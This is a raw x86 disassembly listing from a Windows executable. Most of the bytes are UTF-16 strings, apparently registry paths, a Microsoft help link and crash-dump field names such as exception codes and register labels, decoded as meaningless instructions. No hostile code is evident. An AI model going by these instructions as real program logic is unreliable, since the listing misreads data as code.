  401cf1:	add    BYTE PTR [ebp+0x0],ah
  401cf4:	outs   dx,BYTE PTR ds:[esi]
  401cf5:	add    BYTE PTR [ebp+0x0],ah
  401cf8:	jb     0x401cfa
  401cfa:	popa   
  401cfb:	add    BYTE PTR [eax+eax*1+0x0],ch
  401cff:	add    BYTE PTR [ebp+0x0],dl
  401d02:	jae    0x401d04
  401d04:	add    BYTE PTR gs:[edx+0x0],dh
  401d08:	inc    ebx
  401d09:	add    BYTE PTR [ecx+0x0],ah
  401d0c:	outs   dx,BYTE PTR ds:[esi]
  401d0d:	add    BYTE PTR [ecx+0x0],al
  401d10:	jne    0x401d12
  401d12:	je     0x401d14
  401d14:	outs   dx,DWORD PTR ds:[esi]
  401d15:	add    BYTE PTR [ebx+0x0],dl
  401d18:	add    BYTE PTR gs:[esi+0x0],ch
  401d1c:	add    BYTE PTR fs:[ebp+0x0],al
  401d20:	jb     0x401d22
  401d22:	jb     0x401d24
  401d24:	outs   dx,DWORD PTR ds:[esi]
  401d25:	add    BYTE PTR [edx+0x0],dh
  401d28:	push   edx
  401d29:	add    BYTE PTR [ebp+0x0],ah
  401d2c:	jo     0x401d2e
  401d2e:	outs   dx,DWORD PTR ds:[esi]
  401d2f:	add    BYTE PTR [edx+0x0],dh
  401d32:	je     0x401d34
  401d34:	add    BYTE PTR [eax],al
  401d36:	add    BYTE PTR [eax],al
  401d38:	push   ebx
  401d39:	add    BYTE PTR [edi+0x0],ch
  401d3c:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  401d41:	add    BYTE PTR [ecx+0x0],ah
  401d44:	jb     0x401d46
  401d46:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  401d4b:	add    BYTE PTR [ecx+0x0],ch
  401d4e:	arpl   WORD PTR [eax],ax
  401d50:	jb     0x401d52
  401d52:	outs   dx,DWORD PTR ds:[esi]
  401d53:	add    BYTE PTR [ebx+0x0],dh
  401d56:	outs   dx,DWORD PTR ds:[esi]
  401d57:	add    BYTE PTR [esi+0x0],ah
  401d5a:	je     0x401d5c
  401d5c:	pop    esp
  401d5d:	add    BYTE PTR [eax+0x0],dl
  401d60:	inc    ebx
  401d61:	add    BYTE PTR [eax+0x0],cl
  401d64:	add    BYTE PTR gs:[ecx+0x0],ah
  401d68:	ins    BYTE PTR es:[edi],dx
  401d69:	add    BYTE PTR [eax+eax*1+0x68],dh
  401d6d:	add    BYTE PTR [eax+eax*1+0x45],bl
  401d71:	add    BYTE PTR [edx+0x0],dh
  401d74:	jb     0x401d76
  401d76:	outs   dx,DWORD PTR ds:[esi]
  401d77:	add    BYTE PTR [edx+0x0],dh
  401d7a:	push   edx
  401d7b:	add    BYTE PTR [ebp+0x0],ah
  401d7e:	jo     0x401d80
  401d80:	outs   dx,DWORD PTR ds:[esi]
  401d81:	add    BYTE PTR [edx+0x0],dh
  401d84:	je     0x401d86
  401d86:	imul   eax,DWORD PTR [eax],0x67006e
  401d8c:	pop    esp
  401d8d:	add    BYTE PTR [eax+eax*1+0x57],al
  401d91:	add    BYTE PTR [eax+eax*1+0x49],bl
  401d95:	add    BYTE PTR [esi+0x0],ch
  401d98:	jae    0x401d9a
  401d9a:	je     0x401d9c
  401d9c:	popa   
  401d9d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  401da1:	add    BYTE PTR [ebp+0x0],ah
  401da4:	add    BYTE PTR fs:[eax],al
  401da7:	add    BYTE PTR [eax+eax*1+0x57],al
  401dab:	add    BYTE PTR [eax],dh
  401dad:	add    BYTE PTR [edx],dh
  401daf:	add    BYTE PTR [eax],dh
  401db1:	add    BYTE PTR [eax],dh
  401db3:	add    BYTE PTR [eax],al
  401db5:	add    BYTE PTR [eax],al
  401db7:	add    BYTE PTR [eax+0x4b],cl
  401dba:	dec    esp
  401dbb:	dec    ebp
  401dbc:	pop    esp
  401dbd:	push   ebx
  401dbe:	outs   dx,DWORD PTR ds:[esi]
  401dbf:	data16 je 0x401e39
  401dc2:	popa   
  401dc3:	jb     0x401e2a
  401dc5:	pop    esp
  401dc6:	dec    ebp
  401dc7:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  401dce:	je     0x401e2c
  401dd0:	dec    ecx
  401dd1:	outs   dx,BYTE PTR ds:[esi]
  401dd2:	je     0x401e39
  401dd4:	jb     0x401e44
  401dd6:	gs je  0x401df9
  401dd9:	inc    ebp
  401dda:	js     0x401e4c
  401ddc:	ins    BYTE PTR es:[edi],dx
  401ddd:	outs   dx,DWORD PTR ds:[esi]
  401dde:	jb     0x401e45
  401de0:	jb     0x401e3e
  401de2:	push   edx
  401de3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69746172
  401dec:	outs   dx,DWORD PTR ds:[esi]
  401ded:	outs   dx,BYTE PTR ds:[esi]
  401dee:	pop    esp
  401def:	inc    esp
  401df0:	imul   esp,DWORD PTR [edi+0x69],0x506c6174
  401df7:	jb     0x401e68
  401df9:	fs jne 0x401e5f
  401dfc:	je     0x401e47
  401dfe:	inc    esp
  401dff:	add    BYTE PTR [eax+eax*1+0x77],ah
  401e03:	add    BYTE PTR [edx],dh
  401e05:	add    BYTE PTR [eax],dh
  401e07:	add    BYTE PTR [esi],ch
  401e09:	add    BYTE PTR [ebp+0x0],ah
  401e0c:	js     0x401e0e
  401e0e:	add    BYTE PTR gs:[eax],ah
  401e11:	add    BYTE PTR ds:0x20007800,ch
  401e17:	add    BYTE PTR ds:0x20007300,ch
  401e1d:	add    BYTE PTR ds:0x7500,ah
  401e23:	add    BYTE PTR [eax],al
  401e25:	add    BYTE PTR [eax],al
  401e27:	add    BYTE PTR [edx],cl
  401e29:	add    BYTE PTR [esi+0x0],cl
  401e2c:	dec    ebp
  401e2d:	add    BYTE PTR [ecx+0x0],al
  401e30:	dec    ebx
  401e31:	add    BYTE PTR [ebp+0x0],al
  401e34:	and    BYTE PTR [eax],al
  401e36:	cmp    al,BYTE PTR [eax]
  401e38:	and    BYTE PTR [eax],al
  401e3a:	data16 add BYTE PTR [ecx+0x0],ah
  401e3e:	je     0x401e40
  401e40:	popa   
  401e41:	add    BYTE PTR [eax+eax*1+0x20],ch
  401e45:	add    BYTE PTR [ebp+0x0],ah
  401e48:	jb     0x401e4a
  401e4a:	jb     0x401e4c
  401e4c:	outs   dx,DWORD PTR ds:[esi]
  401e4d:	add    BYTE PTR [edx+0x0],dh
  401e50:	and    BYTE PTR [eax],al
  401e52:	push   ebp
  401e53:	add    BYTE PTR [ecx],dh
  401e55:	add    BYTE PTR [eax],dh
  401e57:	add    BYTE PTR [ebx],dh
  401e59:	add    BYTE PTR [eax],bh
  401e5b:	add    BYTE PTR [edx],bh
  401e5d:	add    BYTE PTR [eax],ah
  401e5f:	add    BYTE PTR [ecx+0x0],cl
  401e62:	outs   dx,BYTE PTR ds:[esi]
  401e63:	add    BYTE PTR [eax+eax*1+0x65],dh
  401e67:	add    BYTE PTR [edx+0x0],dh
  401e6a:	outs   dx,BYTE PTR ds:[esi]
  401e6b:	add    BYTE PTR [ecx+0x0],ah
  401e6e:	ins    BYTE PTR es:[edi],dx
  401e6f:	add    BYTE PTR [eax],ah
  401e71:	add    BYTE PTR [ebp+0x0],ah
  401e74:	jb     0x401e76
  401e76:	jb     0x401e78
  401e78:	outs   dx,DWORD PTR ds:[esi]
  401e79:	add    BYTE PTR [edx+0x0],dh
  401e7c:	or     al,BYTE PTR [eax]
  401e7e:	add    BYTE PTR [eax],al
  401e80:	cs inc ecx
  401e82:	inc    ebx
  401e83:	push   eax
  401e84:	add    BYTE PTR [eax],al
  401e86:	add    BYTE PTR [eax],al
  401e88:	add    BYTE PTR gs:[edx+0x0],dh
  401e8c:	jb     0x401e8e
  401e8e:	outs   dx,DWORD PTR ds:[esi]
  401e8f:	add    BYTE PTR [edx+0x0],dh
  401e92:	jb     0x401e94
  401e94:	add    BYTE PTR gs:[eax+0x0],dh
  401e98:	outs   dx,DWORD PTR ds:[esi]
  401e99:	add    BYTE PTR [edx+0x0],dh
  401e9c:	je     0x401e9e
  401e9e:	cmp    al,BYTE PTR [eax]
  401ea0:	outs   dx,BYTE PTR ds:[esi]
  401ea1:	add    BYTE PTR [edi+0x0],ch
  401ea4:	outs   dx,BYTE PTR ds:[esi]
  401ea5:	add    BYTE PTR [ebp+0x0],ah
  401ea8:	add    BYTE PTR [eax],al
  401eaa:	add    BYTE PTR [eax],al
  401eac:	add    BYTE PTR gs:[edx+0x0],dh
  401eb0:	jb     0x401eb2
  401eb2:	outs   dx,DWORD PTR ds:[esi]
  401eb3:	add    BYTE PTR [edx+0x0],dh
  401eb6:	jb     0x401eb8
  401eb8:	add    BYTE PTR gs:[eax+0x0],dh
  401ebc:	outs   dx,DWORD PTR ds:[esi]
  401ebd:	add    BYTE PTR [edx+0x0],dh
  401ec0:	je     0x401ec2
  401ec2:	cmp    al,BYTE PTR [eax]
  401ec4:	jo     0x401ec6
  401ec6:	jb     0x401ec8
  401ec8:	outs   dx,DWORD PTR ds:[esi]
  401ec9:	add    BYTE PTR [ebp+0x0],ch
  401ecc:	jo     0x401ece
  401ece:	je     0x401ed0
  401ed0:	add    BYTE PTR [eax],al
  401ed2:	add    BYTE PTR [eax],al
  401ed4:	add    BYTE PTR gs:[edx+0x0],dh
  401ed8:	jb     0x401eda
  401eda:	outs   dx,DWORD PTR ds:[esi]
  401edb:	add    BYTE PTR [edx+0x0],dh
  401ede:	jb     0x401ee0
  401ee0:	add    BYTE PTR gs:[eax+0x0],dh
  401ee4:	outs   dx,DWORD PTR ds:[esi]
  401ee5:	add    BYTE PTR [edx+0x0],dh
  401ee8:	je     0x401eea
  401eea:	cmp    al,BYTE PTR [eax]
  401eec:	jno    0x401eee
  401eee:	jne    0x401ef0
  401ef0:	add    BYTE PTR gs:[ebp+0x0],dh
  401ef4:	add    BYTE PTR gs:[eax],al
  401ef7:	add    BYTE PTR [ebp+0x0],ah
  401efa:	jb     0x401efc
  401efc:	jb     0x401efe
  401efe:	outs   dx,DWORD PTR ds:[esi]
  401eff:	add    BYTE PTR [edx+0x0],dh
  401f02:	jb     0x401f04
  401f04:	add    BYTE PTR gs:[eax+0x0],dh
  401f08:	outs   dx,DWORD PTR ds:[esi]
  401f09:	add    BYTE PTR [edx+0x0],dh
  401f0c:	je     0x401f0e
  401f0e:	cmp    al,BYTE PTR [eax]
  401f10:	jae    0x401f12
  401f12:	add    BYTE PTR gs:[esi+0x0],ch
  401f16:	add    BYTE PTR fs:[eax],al
  401f19:	add    BYTE PTR [eax],al
  401f1b:	add    BYTE PTR [ebp+0x0],ah
  401f1e:	jb     0x401f20
  401f20:	jb     0x401f22
  401f22:	outs   dx,DWORD PTR ds:[esi]
  401f23:	add    BYTE PTR [edx+0x0],dh
  401f26:	jb     0x401f28
  401f28:	add    BYTE PTR gs:[eax+0x0],dh
  401f2c:	outs   dx,DWORD PTR ds:[esi]
  401f2d:	add    BYTE PTR [edx+0x0],dh
  401f30:	je     0x401f32
  401f32:	cmp    al,BYTE PTR [eax]
  401f34:	je     0x401f36
  401f36:	add    BYTE PTR gs:[ebx+0x0],dh
  401f3a:	je     0x401f3c
  401f3c:	add    BYTE PTR [eax],al
  401f3e:	add    BYTE PTR [eax],al
  401f40:	push   0x74007400
  401f45:	add    BYTE PTR [eax+0x0],dh
  401f48:	cmp    al,BYTE PTR [eax]
  401f4a:	das    
  401f4b:	add    BYTE PTR [edi],ch
  401f4d:	add    BYTE PTR [edi+0x0],ah
  401f50:	outs   dx,DWORD PTR ds:[esi]
  401f51:	add    BYTE PTR [esi],ch
  401f53:	add    BYTE PTR [ebp+0x0],ch
  401f56:	imul   eax,DWORD PTR [eax],0x720063
  401f5c:	outs   dx,DWORD PTR ds:[esi]
  401f5d:	add    BYTE PTR [ebx+0x0],dh
  401f60:	outs   dx,DWORD PTR ds:[esi]
  401f61:	add    BYTE PTR [esi+0x0],ah
  401f64:	je     0x401f66
  401f66:	add    BYTE PTR cs:[ebx+0x0],ah
  401f6a:	outs   dx,DWORD PTR ds:[esi]
  401f6b:	add    BYTE PTR [ebp+0x0],ch
  401f6e:	das    
  401f6f:	add    BYTE PTR [esi+0x0],ah
  401f72:	ja     0x401f74
  401f74:	ins    BYTE PTR es:[edi],dx
  401f75:	add    BYTE PTR [ecx+0x0],ch
  401f78:	outs   dx,BYTE PTR ds:[esi]
  401f79:	add    BYTE PTR [ebx+0x0],ch
  401f7c:	das    
  401f7d:	add    BYTE PTR [edi],bh
  401f7f:	add    BYTE PTR [eax+eax*1+0x69],cl
  401f83:	add    BYTE PTR [esi+0x0],ch
  401f86:	imul   eax,DWORD PTR [eax],0x49
  401f89:	add    BYTE PTR [eax+eax*1+0x3d],ah
  401f8d:	add    BYTE PTR [edi],dh
  401f8f:	add    BYTE PTR [ecx],bh
  401f91:	add    BYTE PTR ds:0x33003100,dh
	...
  401f9f:	add    BYTE PTR [edx],cl
  401fa1:	add    BYTE PTR [eax],ah
  401fa3:	add    BYTE PTR [eax],ah
  401fa5:	add    BYTE PTR [esi+0x0],dl
  401fa8:	add    BYTE PTR gs:[edx+0x0],dh
  401fac:	jae    0x401fae
  401fae:	imul   eax,DWORD PTR [eax],0x6e006f
  401fb4:	and    BYTE PTR [eax],al
  401fb6:	xor    DWORD PTR [eax],eax
  401fb8:	xor    DWORD PTR [eax],eax
  401fba:	add    BYTE PTR cs:[eax],dh
  401fbd:	add    BYTE PTR [eax],dh
  401fbf:	add    BYTE PTR [esi],ch
  401fc1:	add    BYTE PTR ds:0x37003000,dh
  401fc7:	add    BYTE PTR [edx],dh
  401fc9:	add    BYTE PTR [edi],dh
  401fcb:	add    BYTE PTR [esi],ch
  401fcd:	add    BYTE PTR [ecx],dh
  401fcf:	add    BYTE PTR [edx],cl
  401fd1:	add    BYTE PTR [edx],cl
  401fd3:	add    BYTE PTR [eax],ah
  401fd5:	add    BYTE PTR [eax],ah
  401fd7:	add    BYTE PTR [ebp+0x0],al
  401fda:	js     0x401fdc
  401fdc:	arpl   WORD PTR [eax],ax
  401fde:	add    BYTE PTR gs:[eax+0x0],dh
  401fe2:	je     0x401fe4
  401fe4:	imul   eax,DWORD PTR [eax],0x6e006f
  401fea:	inc    ebx
  401feb:	add    BYTE PTR [edi+0x0],ch
  401fee:	add    BYTE PTR fs:[ebp+0x0],ah
  401ff2:	and    BYTE PTR [eax],al
  401ff4:	and    BYTE PTR [eax],al
  401ff6:	and    BYTE PTR [eax],al
  401ff8:	and    BYTE PTR [eax],al
  401ffa:	and    BYTE PTR [eax],al
  401ffc:	and    BYTE PTR [eax],al
  401ffe:	and    BYTE PTR [eax],al
  402000:	and    BYTE PTR [eax],al
  402002:	and    BYTE PTR [eax],al
  402004:	and    BYTE PTR [eax],al
  402006:	and    BYTE PTR [eax],al
  402008:	and    BYTE PTR [eax],al
  40200a:	cmp    eax,0x25002000
  40200f:	add    BYTE PTR [eax],dh
  402011:	add    BYTE PTR [eax],bh
  402013:	add    BYTE PTR [eax+0x0],bl
  402016:	or     al,BYTE PTR [eax]
  402018:	and    BYTE PTR [eax],al
  40201a:	and    BYTE PTR [eax],al
  40201c:	inc    ebp
  40201d:	add    BYTE PTR [eax+0x0],bh
  402020:	arpl   WORD PTR [eax],ax
  402022:	add    BYTE PTR gs:[eax+0x0],dh
  402026:	je     0x402028
  402028:	imul   eax,DWORD PTR [eax],0x6e006f
  40202e:	inc    esi
  40202f:	add    BYTE PTR [eax+eax*1+0x61],ch
  402033:	add    BYTE PTR [edi+0x0],ah
  402036:	jae    0x402038
  402038:	and    BYTE PTR [eax],al
  40203a:	and    BYTE PTR [eax],al
  40203c:	and    BYTE PTR [eax],al
  40203e:	and    BYTE PTR [eax],al
  402040:	and    BYTE PTR [eax],al
  402042:	and    BYTE PTR [eax],al
  402044:	and    BYTE PTR [eax],al
  402046:	and    BYTE PTR [eax],al
  402048:	and    BYTE PTR [eax],al
  40204a:	and    BYTE PTR [eax],al
  40204c:	and    BYTE PTR [eax],al
  40204e:	cmp    eax,0x25002000
  402053:	add    BYTE PTR [eax],dh
  402055:	add    BYTE PTR [eax],bh
  402057:	add    BYTE PTR [eax+0x0],bl
  40205a:	or     al,BYTE PTR [eax]
  40205c:	and    BYTE PTR [eax],al
  40205e:	and    BYTE PTR [eax],al
  402060:	inc    ebp
  402061:	add    BYTE PTR [eax+0x0],bh
  402064:	arpl   WORD PTR [eax],ax
  402066:	add    BYTE PTR gs:[eax+0x0],dh
  40206a:	je     0x40206c
  40206c:	imul   eax,DWORD PTR [eax],0x6e006f
  402072:	inc    ecx
  402073:	add    BYTE PTR [eax+eax*1+0x64],ah
  402077:	add    BYTE PTR [edx+0x0],dh
  40207a:	add    BYTE PTR gs:[ebx+0x0],dh
  40207e:	jae    0x402080
  402080:	and    BYTE PTR [eax],al
  402082:	and    BYTE PTR [eax],al
  402084:	and    BYTE PTR [eax],al
  402086:	and    BYTE PTR [eax],al
  402088:	and    BYTE PTR [eax],al
  40208a:	and    BYTE PTR [eax],al
  40208c:	and    BYTE PTR [eax],al
  40208e:	and    BYTE PTR [eax],al
  402090:	and    BYTE PTR [eax],al
  402092:	cmp    eax,0x25002000
  402097:	add    BYTE PTR [eax+0x0],dh
  40209a:	add    BYTE PTR [eax],al
  40209c:	and    BYTE PTR [eax],al
  40209e:	sub    BYTE PTR [eax],al
  4020a0:	and    eax,0x29007000
  4020a5:	add    BYTE PTR [eax],ah
  4020a7:	add    BYTE PTR [edx],ah
  4020a9:	add    BYTE PTR ds:0x22007300,ah
	...
  4020b7:	add    BYTE PTR [edx],cl
  4020b9:	add    BYTE PTR [eax],ah
  4020bb:	add    BYTE PTR [eax],ah
  4020bd:	add    BYTE PTR [esi+0x0],cl
  4020c0:	jne    0x4020c2
  4020c2:	ins    DWORD PTR es:[edi],dx
  4020c3:	add    BYTE PTR [edx+0x0],ah
  4020c6:	add    BYTE PTR gs:[edx+0x0],dh
  4020ca:	push   eax
  4020cb:	add    BYTE PTR [ecx+0x0],ah
  4020ce:	jb     0x4020d0
  4020d0:	popa   
  4020d1:	add    BYTE PTR [ebp+0x0],ch
  4020d4:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  4020d9:	add    BYTE PTR [edx+0x0],dh
  4020dc:	jae    0x4020de
  4020de:	and    BYTE PTR [eax],al
  4020e0:	and    BYTE PTR [eax],al
  4020e2:	and    BYTE PTR [eax],al
  4020e4:	and    BYTE PTR [eax],al
  4020e6:	and    BYTE PTR [eax],al
  4020e8:	and    BYTE PTR [eax],al
  4020ea:	and    BYTE PTR [eax],al
  4020ec:	and    BYTE PTR [eax],al
  4020ee:	and    BYTE PTR [eax],al
  4020f0:	cmp    eax,0x25002000
  4020f5:	add    BYTE PTR [eax],dh
  4020f7:	add    BYTE PTR [eax],bh
  4020f9:	add    BYTE PTR [eax+0x0],bl
  4020fc:	or     al,BYTE PTR [eax]
  4020fe:	add    BYTE PTR [eax],al
  402100:	and    BYTE PTR [eax],al
  402102:	and    BYTE PTR [eax],al
  402104:	inc    ebp
  402105:	add    BYTE PTR [eax+0x0],bh
  402108:	arpl   WORD PTR [eax],ax
  40210a:	add    BYTE PTR gs:[eax+0x0],dh
  40210e:	je     0x402110
  402110:	imul   eax,DWORD PTR [eax],0x6e006f
  402116:	dec    ecx
  402117:	add    BYTE PTR [esi+0x0],ch
  40211a:	data16 add BYTE PTR [edi+0x0],ch
  40211e:	jb     0x402120
  402120:	ins    DWORD PTR es:[edi],dx
  402121:	add    BYTE PTR [ecx+0x0],ah
  402124:	je     0x402126
  402126:	imul   eax,DWORD PTR [eax],0x6e006f
  40212c:	pop    ebx
  40212d:	add    BYTE PTR ds:0x75003200,ah
  402133:	add    BYTE PTR [ebp+0x0],bl
  402136:	and    BYTE PTR [eax],al
  402138:	cmp    eax,0x25002000
  40213d:	add    BYTE PTR [eax+0x0],dh
  402140:	or     al,BYTE PTR [eax]
  402142:	add    BYTE PTR [eax],al
  402144:	add    BYTE PTR [eax],al
  402146:	add    BYTE PTR [eax],al
  402148:	or     al,BYTE PTR [eax]
  40214a:	inc    ebx
  40214b:	add    BYTE PTR [edi+0x0],cl
  40214e:	dec    esi
  40214f:	add    BYTE PTR [eax+eax*1+0x45],dl
  402153:	add    BYTE PTR [eax+0x0],bl
  402156:	push   esp
  402157:	add    BYTE PTR [edx],bh
  402159:	add    BYTE PTR [edx],cl
  40215b:	add    BYTE PTR [eax],ah
  40215d:	add    BYTE PTR [eax],ah
  40215f:	add    BYTE PTR [ebp+0x0],al
  402162:	popa   
  402163:	add    BYTE PTR [eax+0x0],bh
  402166:	and    BYTE PTR [eax],al
  402168:	and    BYTE PTR [eax],al
  40216a:	and    BYTE PTR [eax],al
  40216c:	and    BYTE PTR [eax],al
  40216e:	cmp    eax,0x25002000
  402173:	add    BYTE PTR [eax+0x0],dh
  402176:	and    BYTE PTR [eax],al
  402178:	and    BYTE PTR [eax],al
  40217a:	inc    ebp
  40217b:	add    BYTE PTR [ebx+0x0],dh
  40217e:	jo     0x402180
  402180:	and    BYTE PTR [eax],al
  402182:	and    BYTE PTR [eax],al
  402184:	and    BYTE PTR [eax],al
  402186:	and    BYTE PTR [eax],al
  402188:	cmp    eax,0x25002000
  40218d:	add    BYTE PTR [eax+0x0],dh
  402190:	or     al,BYTE PTR [eax]
  402192:	and    BYTE PTR [eax],al
  402194:	and    BYTE PTR [eax],al
  402196:	inc    ebp
  402197:	add    BYTE PTR [edx+0x0],ah
  40219a:	js     0x40219c
  40219c:	and    BYTE PTR [eax],al
  40219e:	and    BYTE PTR [eax],al
  4021a0:	and    BYTE PTR [eax],al
  4021a2:	and    BYTE PTR [eax],al
  4021a4:	cmp    eax,0x25002000
  4021a9:	add    BYTE PTR [eax+0x0],dh
  4021ac:	and    BYTE PTR [eax],al
  4021ae:	and    BYTE PTR [eax],al
  4021b0:	inc    ebp
  4021b1:	add    BYTE PTR [edx+0x0],ah
  4021b4:	jo     0x4021b6
  4021b6:	and    BYTE PTR [eax],al
  4021b8:	and    BYTE PTR [eax],al
  4021ba:	and    BYTE PTR [eax],al
  4021bc:	and    BYTE PTR [eax],al
  4021be:	cmp    eax,0x25002000
  4021c3:	add    BYTE PTR [eax+0x0],dh
  4021c6:	or     al,BYTE PTR [eax]
  4021c8:	and    BYTE PTR [eax],al
  4021ca:	and    BYTE PTR [eax],al
  4021cc:	inc    ebp
  4021cd:	add    BYTE PTR [ebx+0x0],ah
  4021d0:	js     0x4021d2
  4021d2:	and    BYTE PTR [eax],al
  4021d4:	and    BYTE PTR [eax],al
  4021d6:	and    BYTE PTR [eax],al
  4021d8:	and    BYTE PTR [eax],al
  4021da:	cmp    eax,0x25002000
  4021df:	add    BYTE PTR [eax+0x0],dh
  4021e2:	and    BYTE PTR [eax],al
  4021e4:	and    BYTE PTR [eax],al
  4021e6:	inc    ebp
  4021e7:	add    BYTE PTR [ebx+0x0],dh
  4021ea:	imul   eax,DWORD PTR [eax],0x200020
  4021f0:	and    BYTE PTR [eax],al
  4021f2:	and    BYTE PTR [eax],al
  4021f4:	cmp    eax,0x25002000
  4021f9:	add    BYTE PTR [eax+0x0],dh
  4021fc:	or     al,BYTE PTR [eax]
  4021fe:	and    BYTE PTR [eax],al
  402200:	and    BYTE PTR [eax],al
  402202:	inc    ebp
  402203:	add    BYTE PTR [eax+eax*1+0x78],ah
  402207:	add    BYTE PTR [eax],ah
  402209:	add    BYTE PTR [eax],ah
  40220b:	add    BYTE PTR [eax],ah
  40220d:	add    BYTE PTR [eax],ah
  40220f:	add    BYTE PTR ds:0x25002000,bh
  402215:	add    BYTE PTR [eax+0x0],dh
  402218:	and    BYTE PTR [eax],al
  40221a:	and    BYTE PTR [eax],al
  40221c:	inc    ebp
  40221d:	add    BYTE PTR [eax+eax*1+0x69],ah
  402221:	add    BYTE PTR [eax],ah
  402223:	add    BYTE PTR [eax],ah
  402225:	add    BYTE PTR [eax],ah
  402227:	add    BYTE PTR [eax],ah
  402229:	add    BYTE PTR ds:0x25002000,bh
  40222f:	add    BYTE PTR [eax+0x0],dh
  402232:	or     al,BYTE PTR [eax]
  402234:	and    BYTE PTR [eax],al
  402236:	and    BYTE PTR [eax],al
  402238:	inc    ebp
  402239:	add    BYTE PTR [ecx+0x0],ch
  40223c:	jo     0x40223e
  40223e:	and    BYTE PTR [eax],al
  402240:	and    BYTE PTR [eax],al
  402242:	and    BYTE PTR [eax],al
  402244:	and    BYTE PTR [eax],al
  402246:	cmp    eax,0x25002000
  40224b:	add    BYTE PTR [eax+0x0],dh
  40224e:	and    BYTE PTR [eax],al
  402250:	and    BYTE PTR [eax],al
  402252:	inc    ebp
  402253:	add    BYTE PTR [esi+0x0],al
  402256:	ins    BYTE PTR es:[edi],dx
  402257:	add    BYTE PTR [ecx+0x0],ah
  40225a:	add    BYTE PTR [bp+di+0x0],dh
  40225e:	and    BYTE PTR [eax],al
  402260:	cmp    eax,0x25002000
  402265:	add    BYTE PTR [eax+0x0],dh
  402268:	or     al,BYTE PTR [eax]
  40226a:	and    BYTE PTR [eax],al
  40226c:	and    BYTE PTR [eax],al
  40226e:	push   ebx
  40226f:	add    BYTE PTR [ebp+0x0],ah
  402272:	add    BYTE PTR [bp+di+0x0],al
  402276:	jae    0x402278
  402278:	and    BYTE PTR [eax],al
  40227a:	and    BYTE PTR [eax],al
  40227c:	cmp    eax,0x25002000
  402281:	add    BYTE PTR [eax+0x0],dh
  402284:	and    BYTE PTR [eax],al
  402286:	and    BYTE PTR [eax],al
  402288:	push   ebx
  402289:	add    BYTE PTR [ebp+0x0],ah
  40228c:	add    BYTE PTR [si+0x0],al
  402290:	jae    0x402292
  402292:	and    BYTE PTR [eax],al
  402294:	and    BYTE PTR [eax],al
  402296:	cmp    eax,0x25002000
  40229b:	add    BYTE PTR [eax+0x0],dh
  40229e:	or     al,BYTE PTR [eax]
  4022a0:	and    BYTE PTR [eax],al
  4022a2:	and    BYTE PTR [eax],al
  4022a4:	push   ebx
  4022a5:	add    BYTE PTR [ebp+0x0],ah
  4022a8:	add    BYTE PTR [bp+di+0x0],dl
  4022ac:	jae    0x4022ae
  4022ae:	and    BYTE PTR [eax],al
  4022b0:	and    BYTE PTR [eax],al
  4022b2:	cmp    eax,0x25002000
  4022b7:	add    BYTE PTR [eax+0x0],dh
  4022ba:	and    BYTE PTR [eax],al
  4022bc:	and    BYTE PTR [eax],al
  4022be:	push   ebx
  4022bf:	add    BYTE PTR [ebp+0x0],ah
  4022c2:	add    BYTE PTR [di+0x0],al
  4022c6:	jae    0x4022c8
  4022c8:	and    BYTE PTR [eax],al
  4022ca:	and    BYTE PTR [eax],al
  4022cc:	cmp    eax,0x25002000
  4022d1:	add    BYTE PTR [eax+0x0],dh
  4022d4:	or     al,BYTE PTR [eax]
  4022d6:	and    BYTE PTR [eax],al
  4022d8:	and    BYTE PTR [eax],al
  4022da:	push   ebx
  4022db:	add    BYTE PTR [ebp+0x0],ah
  4022de:	add    BYTE PTR [bp+0x0],al
  4022e2:	jae    0x4022e4
  4022e4:	and    BYTE PTR [eax],al
  4022e6:	and    BYTE PTR [eax],al
  4022e8:	cmp    eax,0x25002000
  4022ed:	add    BYTE PTR [eax+0x0],dh
  4022f0:	and    BYTE PTR [eax],al
  4022f2:	and    BYTE PTR [eax],al
  4022f4:	push   ebx
  4022f5:	add    BYTE PTR [ebp+0x0],ah
  4022f8:	add    BYTE PTR [bx+0x0],al
  4022fc:	jae    0x4022fe
  4022fe:	and    BYTE PTR [eax],al
  402300:	and    BYTE PTR [eax],al
  402302:	cmp    eax,0x25002000
  402307:	add    BYTE PTR [eax+0x0],dh
  40230a:	or     al,BYTE PTR [eax]
  40230c:	and    BYTE PTR [eax],al
  40230e:	and    BYTE PTR [eax],al
  402310:	inc    esp
  402311:	add    BYTE PTR [edx+0x0],dh
  402314:	xor    BYTE PTR [eax],al
  402316:	and    BYTE PTR [eax],al
  402318:	and    BYTE PTR [eax],al
  40231a:	and    BYTE PTR [eax],al
  40231c:	and    BYTE PTR [eax],al
  40231e:	cmp    eax,0x25002000
  402323:	add    BYTE PTR [eax+0x0],dh
  402326:	and    BYTE PTR [eax],al
  402328:	and    BYTE PTR [eax],al
  40232a:	inc    esp
  40232b:	add    BYTE PTR [edx+0x0],dh
  40232e:	xor    eax,DWORD PTR [eax]
  402330:	and    BYTE PTR [eax],al
  402332:	and    BYTE PTR [eax],al
  402334:	and    BYTE PTR [eax],al
  402336:	and    BYTE PTR [eax],al
  402338:	cmp    eax,0x25002000
  40233d:	add    BYTE PTR [eax+0x0],dh
  402340:	or     al,BYTE PTR [eax]
  402342:	and    BYTE PTR [eax],al
  402344:	and    BYTE PTR [eax],al
  402346:	inc    esp
  402347:	add    BYTE PTR [edx+0x0],dh
  40234a:	xor    DWORD PTR [eax],eax
  40234c:	and    BYTE PTR [eax],al
  40234e:	and    BYTE PTR [eax],al
  402350:	and    BYTE PTR [eax],al
  402352:	and    BYTE PTR [eax],al
  402354:	cmp    eax,0x25002000
  402359:	add    BYTE PTR [eax+0x0],dh
  40235c:	and    BYTE PTR [eax],al
  40235e:	and    BYTE PTR [eax],al
  402360:	inc    esp
  402361:	add    BYTE PTR [edx+0x0],dh
  402364:	add    BYTE PTR ss:[eax],ah
  402367:	add    BYTE PTR [eax],ah
  402369:	add    BYTE PTR [eax],ah
  40236b:	add    BYTE PTR [eax],ah
  40236d:	add    BYTE PTR ds:0x25002000,bh
  402373:	add    BYTE PTR [eax+0x0],dh
  402376:	or     al,BYTE PTR [eax]
  402378:	and    BYTE PTR [eax],al
  40237a:	and    BYTE PTR [eax],al
  40237c:	inc    esp
  40237d:	add    BYTE PTR [edx+0x0],dh
  402380:	xor    al,BYTE PTR [eax]
  402382:	and    BYTE PTR [eax],al
